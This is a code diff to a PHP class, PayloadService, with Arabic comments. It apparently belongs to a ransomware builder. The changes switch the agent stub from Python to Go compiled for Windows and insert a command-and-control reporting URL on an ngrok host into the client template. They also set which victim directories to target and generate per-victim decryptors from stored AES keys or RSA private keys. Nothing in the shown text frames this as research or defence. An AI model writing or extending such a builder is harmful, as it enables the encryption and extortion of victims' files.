@@ -31,7 +31,8 @@ class PayloadService
             mkdir($tempDir, 0777, true);
         }
 
-        $scriptPath = $tempDir.'/agent.py';
+        // استخدام صيغة .go بدلاً من .py
+        $scriptPath = $tempDir.'/agent.go';
         $finalDir = storage_path('app/public/payloads');
         if (! file_exists($finalDir)) {
             mkdir($finalDir, 0777, true);
@@ -44,9 +45,10 @@ class PayloadService
         if ($platform === 'windows') {
             $logPath = storage_path('app/temp/build_error.log');
 
+            // التبديل إلى أمر تجميع Go المباشر لنظام ويندوز (Cross-Compilation)
             $command = sprintf(
-                'export WINEPREFIX="/home/u113/.wine"; wine python -m PyInstaller --onefile --distpath %s %s > %s 2>&1 &',
-                escapeshellarg($finalDir),
+                'GOOS=windows GOARCH=amd64 go build -o %s %s > %s 2>&1',
+                escapeshellarg($finalPath),
                 escapeshellarg($scriptPath),
                 escapeshellarg($logPath)
             );
@@ -54,10 +56,11 @@ class PayloadService
             exec($command);
         }
 
-        return $finalPath;
+        return 'payloads/'.$profileId.'.exe';
     }
 
-    public function createDecryptorPayload($victim) {
+    public function createDecryptorPayload($victim)
+    {
         $algorithm = strtoupper($victim->encryption_type ?? 'AES');
         $decryptKey = ($algorithm === 'RSA') ? $victim->private_key : $victim->encryption_key;
 
@@ -65,11 +68,28 @@ class PayloadService
             return null;
         }
 
-        $targetDirs = ['Desktop', 'Documents', 'Downloads']; 
+        $targetDirs = ['Desktop', 'Documents', 'Downloads'];
+        
+        $latestPayload = \App\Models\Payload::latest()->first();
+        if ($latestPayload && !empty($latestPayload->target_directories)) {
+            $dirs = $latestPayload->target_directories;
+            if (is_string($dirs) && str_starts_with(trim($dirs), '[')) {
+                $decoded = json_decode($dirs, true);
+                if (is_array($decoded)) {
+                    $targetDirs = $decoded;
+                }
+            } elseif (is_array($dirs)) {
+                $targetDirs = $dirs;
+            }
+        }
 
         $stubFile = ($algorithm === 'RSA') 
             ? resource_path('stubs/rsa_decryptor.py') 
             : resource_path('stubs/aes_decryptor.py');
+
+        if (!file_exists($stubFile)) {
+            return null;
+        }
 
         $code = file_get_contents($stubFile);
         $dirsListPython = json_encode($targetDirs);
@@ -108,26 +128,31 @@ class PayloadService
         return 'decryptors/'.$filename;
     }
 
-    protected function getClientCodeTemplate($targetDirs, $algorithm) {
-            $c2ServerUrl = 'https://babble-flagman-divorcee.ngrok-free.dev/api/v1/report';
+protected function getClientCodeTemplate($targetDirs, $algorithm) {
+        $c2ServerUrl = 'https://babble-flagman-divorcee.ngrok-free.dev/api/v1/report';
 
-            $algoClean = strtoupper(trim($algorithm));
+        $algoClean = strtoupper(trim($algorithm));
 
-            $stubFile = ($algoClean === 'RSA') 
-                ? resource_path('stubs/rsa_agent.py') 
-                : resource_path('stubs/aes_agent.py');
+        $stubFile = ($algoClean === 'RSA') 
+            ? resource_path('stubs/rsa_agent.go') 
+            : resource_path('stubs/aes_agent.go');
 
-            if (!file_exists($stubFile)) {
-                $stubFile = resource_path('stubs/aes_agent.py');
-            }
+        if (!file_exists($stubFile)) {
+            $stubFile = resource_path('stubs/aes_agent.go');
+        }
 
-            $code = file_get_contents($stubFile);
+        $code = file_get_contents($stubFile);
 
-            $dirsListPython = is_array($targetDirs) ? json_encode($targetDirs) : json_encode([$targetDirs]);
+        // دمج المجلدات كنص مفصول بفواصل (مثل: Desktop,Documents,Downloads)
+        if (is_array($targetDirs)) {
+            $formattedDirs = implode(',', $targetDirs);
+        } else {
+            $formattedDirs = $targetDirs;
+        }
 
-            $code = str_replace('__C2_SERVER_URL__', $c2ServerUrl, $code);
-            $code = str_replace('__TARGET_DIRECTORIES__', $dirsListPython, $code);
+        $code = str_replace('__C2_SERVER_URL__', $c2ServerUrl, $code);
+        $code = str_replace('__TARGET_DIRECTORIES__', $formattedDirs, $code);
 
-            return $code;
+        return $code;
     }
 }
